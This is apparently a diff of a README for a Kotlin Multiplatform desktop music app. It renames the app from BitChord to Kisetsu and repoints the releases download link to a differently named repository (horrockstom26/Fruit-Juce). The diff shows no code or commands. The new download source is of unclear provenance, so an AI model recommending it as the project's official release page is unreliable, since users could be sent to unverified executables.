@@ -1,6 +1,6 @@
-# BitChord Desktop
+# Kisetsu Desktop
 
-BitChord now has a Kotlin Multiplatform shared module and a Compose Multiplatform
+Kisetsu now has a Kotlin Multiplatform shared module and a Compose Multiplatform
 desktop application for Linux and Windows. Desktop uses the JVM target, which is
 the supported Compose Multiplatform desktop model; macOS is intentionally not a
 configured target.
@@ -21,7 +21,7 @@ running `gradlew.bat :desktopApp:run`.
 
 ## Installing a release
 
-Every download on the [releases page](https://github.com/kushagrasinghx/BitChord/releases) carries its own Java
+Every download on the [releases page](https://github.com/horrockstom26/Fruit-Juce/releases) carries its own Java
 runtime, the FFmpeg and ONNX natives, the Automix analyser and its models.
 Nothing else has to be installed first — no JDK, no codec pack.
 
@@ -46,7 +46,7 @@ time.
 
 **Windows and the Visual C++ runtime.** The Automix analyser is linked against a
 static C runtime, so on almost every machine there is nothing to install. If
-BitChord starts but Automix never analyses anything, install the
+Kisetsu starts but Automix never analyses anything, install the
 [Microsoft Visual C++ 2015–2022 Redistributable (x64)](https://aka.ms/vs/17/release/vc_redist.x64.exe)
 and restart it — that is the one dependency the bundled runtime cannot carry
 itself, because Windows expects it to be a system component.
